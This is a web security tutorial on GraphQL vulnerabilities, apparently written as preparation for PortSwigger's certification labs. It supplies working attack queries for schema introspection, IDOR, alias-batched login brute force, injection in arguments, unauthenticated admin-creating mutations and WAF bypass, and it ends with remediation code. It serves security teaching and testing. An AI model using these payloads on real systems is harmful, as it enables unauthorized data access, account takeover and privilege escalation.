GraphQL Vulnerabilities

GraphQL's flexibility allows clients to request exactly the data they want ·but when introspection is enabled and authorization isn't enforced per-field, attackers can enumerate the entire schema, extract sensitive data, and bypass access controls.

CRITICAL HIGH BSCP Intermediate

Real-World Analogy

📚 The Transparent Library Catalog

Normally, a library system lets you search by book title only. GraphQL is like walking up to the librarian and being able to ask: "Give me every book, plus the author's home address, plus every other patron's complete reading history." Not only does the librarian have access to all this data, but the system doesn't stop you from asking ·it just returns whatever you request. If the front desk doesn't verify you're supposed to see the author's address, it gives it to you anyway.

How It Works

GraphQL is a query language that lets clients specify exactly what data they need. Unlike REST APIs where the server decides what to return, GraphQL clients are in control:

query {
  user(id: 123) {
    name
    email
    password
    phone
  }
}

The server executes this and returns exactly those fields. The problem: if the server doesn't verify field-level access controls, and if introspection is enabled, attackers can:

  1. Run an introspection query to see the entire API schema
  2. Discover fields that shouldn't be publicly exposed
  3. Query those fields directly (e.g., admin panels, password hashes, other users' data)
  4. Abuse mutations to modify data without proper authorization
💡 GraphQL Introspection

Introspection is a built-in feature that returns the schema structure. It's enabled by default in most GraphQL servers for development. In production, it's often left on by accident, allowing attackers to discover the entire API surface, including hidden queries and mutations.

Finding GraphQL Endpoints

GraphQL endpoints often live at predictable paths:

  • /graphql
  • /api/graphql
  • /v1/graphql
  • /gql
  • /api/query
  • /.well-known/graphql-voyager

They typically accept POST requests with Content-Type: application/json and a JSON body containing a query field. Some support GET with the query in the URL.

💡 Finding Hidden GraphQL

If you can't find a GraphQL endpoint at the obvious paths, check JavaScript files. Many apps load the schema or GraphQL client URL from their front-end code. Search for "graphql", "apollo", "relay", or "gql" in network requests and bundled JavaScript.

The Introspection Query

The first thing to run against a GraphQL endpoint is an introspection query. This returns the entire schema:

{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name ofType { name } } }
        type { name ofType { name } }
      }
    }
  }
}

Send this POST request to /graphql. If introspection is enabled, you'll get a massive JSON response describing every type, field, query, and mutation. Save this output ·it's your roadmap.

Where to Look & Attack Techniques

1. Introspection to Schema Enumeration

Run the introspection query. If successful, you now know:

  • All available queries (what data you can request)
  • All mutations (what actions you can perform)
  • All types and fields, including hidden ones like adminPanel, backupAccounts, passwordHash

2. IDOR via Direct ID Queries

GraphQL often accepts IDs directly in queries. Try querying other users:

query {
  user(id: 2) {
    name
    email
    phone
    isAdmin
  }
}

query {
  user(id: 3) {
    name
    email
    phone
    isAdmin
  }
}

If there's no authorization check, you'll get other users' data. This is a direct IDOR vulnerability in GraphQL.

3. Batching / Alias Attacks

GraphQL allows multiple queries in a single request using aliases, which can bypass rate limits:

query {
  login1: login(username: "admin", password: "password1") { token }
  login2: login(username: "admin", password: "password2") { token }
  login3: login(username: "admin", password: "password3") { token }
  ...
}

Send 100 login attempts in a single request. If the server rate-limits per-request instead of per-query, all 100 passwords will be tried.

4. Field Suggestion Exploitation

Try requesting a field that doesn't exist:

query {
  user(id: 1) {
    name
    adminPanel
  }
}

Some GraphQL servers respond with helpful suggestions:

errors: [
  {
    message: "Cannot query field 'adminPanel'. Did you mean 'admin', 'panel', or 'adminSettings'?"
  }
]

This leaks the existence of hidden fields that weren't listed in introspection.

5. Injection in Query Arguments

GraphQL arguments can be vulnerable to injection attacks. Try injecting SQL or template syntax:

query {
  users(filter: "' OR '1'='1") {
    name
    email
  }
}

Or if arguments are used in server-side operations:

query {
  search(term: "{{ 7*7 }}") {
    results
  }
}

6. Information Disclosure via Error Messages

GraphQL errors often reveal internal details:

query {
  user(id: "invalid") {
    name
  }
}

Response might reveal: TypeError: Cannot read property 'name' of undefined at /app/src/resolvers.js:42. This leaks file paths, function names, and stack traces.

7. Mutations Without Authentication

Try executing mutations without being logged in:

mutation {
  deleteUser(id: 123) {
    success
  }
}

mutation {
  createAdmin(username: "hacker", password: "123") {
    success
  }
}

If mutations aren't wrapped in authentication checks, you might be able to modify data as an anonymous user.

Burp Suite Workflow

1

Find the GraphQL Endpoint

Check Burp Proxy history for requests to /graphql, /api/graphql, or similar. Look for POST requests with Content-Type: application/json that have a query field in the body.

2

Run the Introspection Query

Copy a GraphQL request to Repeater. Modify the body to the introspection query (above). Send it. If introspection is enabled, you'll get the full schema.

3

Visualize the Schema

Paste the introspection output into GraphQL Voyager (graphql-voyager.com) or InQL (Burp plugin). These tools visually map the entire schema, making it easy to spot sensitive fields.

4

Test for IDOR

In Repeater, craft a query that requests another user's data by ID:

{"query": "query { user(id: 2) { name email phone } }"}

Try different IDs (1, 2, 3, 100, 9999). If all succeed, IDOR is confirmed.

5

Test Batching Attacks

Craft a mutation with aliases for brute-force login:

{"query": "mutation { a1: login(user:\"admin\" pass:\"pass1\") {token} a2: login(user:\"admin\" pass:\"pass2\") {token} ... }"}

Send this. If all attempts execute, rate limiting is bypassed.

6

Check Authorization

Test if mutations are protected. Try deleting or creating data as an unauthenticated or low-privilege user:

{"query": "mutation { deleteUser(id: 999) { success } }"}

WAF Bypass Techniques

Field Aliasing

WAFs pattern-match field names. Use aliases to rename sensitive fields: the underlying query is identical but the surface looks different.

{ x: __schema { y: types { z: name } } }

Instead of directly querying __schema, you use aliases (x, y, z) to obscure the actual field names.

Query Batching

Send multiple operations in a single request as a JSON array. Many WAFs inspect each operation individually and miss the combined effect:

[{"query":"..."},{"query":"..."}]

Introspection Obfuscation

Replace __schema with fragments: define a fragment on __Schema and spread it. Some WAFs block the literal string __schema but not fragments that resolve to it.

Variable Injection

Move attack payloads into GraphQL variables instead of inline values. WAFs often parse the query string but not the variables JSON object separately:

{"query":"query($x:String!){user(id:$x){name}}","variables":{"x":"' OR 1=1"}}

Whitespace and Newline Injection

Insert newlines or tabs inside field names (GraphQL parsers ignore them):

{ __\nschema\t{ types { name } } }

POST vs GET Switching

GraphQL supports both POST and GET. If WAF blocks POST mutations, try GET:

GET /graphql?query={mutation{deleteUser(id:1)}}

Exploitation & Impact

Unauthorized Data Access (Confidentiality Breach)

Use IDOR to read all users' email addresses, phone numbers, password hashes, API keys, and private messages. A single introspection + IDOR query chain can exfiltrate the entire user database.

Account Takeover

If a mutation allows password reset without proper authorization, or if you can query password reset tokens, you can hijack accounts.

Privilege Escalation

If a mutation allows role assignment without auth checks, promote yourself to admin:

mutation { updateUser(id: 123, role: "ADMIN") { success } }

Batching-Based Brute-Force

Bypass rate limits and brute-force login credentials, API keys, or OTP codes.

Denial of Service

Send deeply nested queries or complex mutations that cause exponential queries, exhausting server resources and crashing the service.

🚨 Real-World Impact

In 2021, a GraphQL API leak exposed millions of user records from a major social platform because introspection was enabled and field-level authorization was missing. Attackers enumerated the schema, discovered a poorly-secured user query, and dumped the entire user database.

Remediation

1. Disable Introspection in Production

// In Apollo Server
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: false,  // Disable in production
});

// In other GraphQL servers, disable __schema queries

2. Implement Field-Level Authorization

Check permissions for every field, not just at the root query:

const user = {
  name: () => user.name,
  email: (parent, args, ctx) => {
    if (ctx.user.id !== parent.id && !ctx.user.isAdmin) {
      throw new Error("Unauthorized");
    }
    return parent.email;
  },
  passwordHash: (parent, args, ctx) => {
    if (!ctx.user.isAdmin) {
      throw new Error("Unauthorized");
    }
    return parent.passwordHash;
  }
};

3. Enable Query Complexity Limits

// Limit query depth and complexity
const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [
    createComplexityLimitRule({ maxComplexity: 1000, onComplete: () => {} })
  ]
});

4. Disable Query Batching or Rate-Limit Globally

// Limit to 1 query per request
app.post("/graphql", (req, res) => {
  if (Array.isArray(req.body)) {
    return res.status(400).json({ error: "Batching not allowed" });
  }
  // Handle single query
});

5. Validate All Inputs & Parameterize Queries

Never interpolate user input into queries. Use GraphQL variables:

// SAFE: Use variables
query searchUsers($filter: String!) {
  users(filter: $filter) { name }
}

6. Implement Proper Authentication & Authorization

Verify the user is authenticated before processing queries. Check permissions for every mutation.

7. Comprehensive Logging & Monitoring

Log all queries and mutations, especially those involving sensitive data or administrative actions. Alert on introspection attempts in production.

PortSwigger Labs

  • Accessing private GraphQL posts · Use introspection to discover a hidden postPassword field and retrieve private blog posts via GraphQL query.
  • Accidental exposure of private GraphQL fields · Find and access fields that should be restricted but are returned by introspection.
  • Finding a hidden GraphQL endpoint · Discover an undocumented GraphQL endpoint using universal queries and path fuzzing.
  • Bypassing GraphQL brute force protections · Use query aliasing/batching to send 100 login attempts in a single HTTP request, bypassing rate limiting.
  • Performing CSRF exploits over GraphQL · Craft a CSRF PoC that triggers a GraphQL mutation using a simple form POST.
  • Bypassing GraphQL introspection defences · Introspection is blocked by a WAF/filter · bypass it using newlines, fragments, or GET requests.

Common Beginner Mistakes

❌ Not Finding the GraphQL Endpoint

Mistake: Checking only /graphql and giving up. GraphQL endpoints hide in various paths.

Fix: Check your Burp history for POST requests with JSON. Search JavaScript for "graphql" or "apollo". Try common alternate paths: /api/graphql, /v1/graphql, /gql.

❌ Skipping the Introspection Step

Mistake: Trying to guess query names instead of running introspection. You'll miss hidden fields and mutations.

Fix: Always run introspection first. If it's disabled, the endpoint is probably hardened. Move on to testing specific queries you've seen in traffic.

❌ Not Using GraphQL Voyager

Mistake: Trying to read the introspection JSON manually. Voyager visualizes it and makes vulnerabilities obvious.

Fix: Paste introspection output into graphql-voyager.com. You'll immediately see the entire API surface, including sensitive fields.

❌ Missing Batching Attacks

Mistake: Testing IDOR and then moving on. You might miss rate-limit bypass via aliases.

Fix: After testing basic queries, craft a batching mutation to send 50 login attempts in one request.

❌ Forgetting Authorization Testing

Mistake: Testing queries but not mutations. Mutations are where the real damage is (delete, create, modify).

Fix: For every mutation, test: (1) as unauthenticated, (2) as low-privilege user, (3) modifying other users' data.
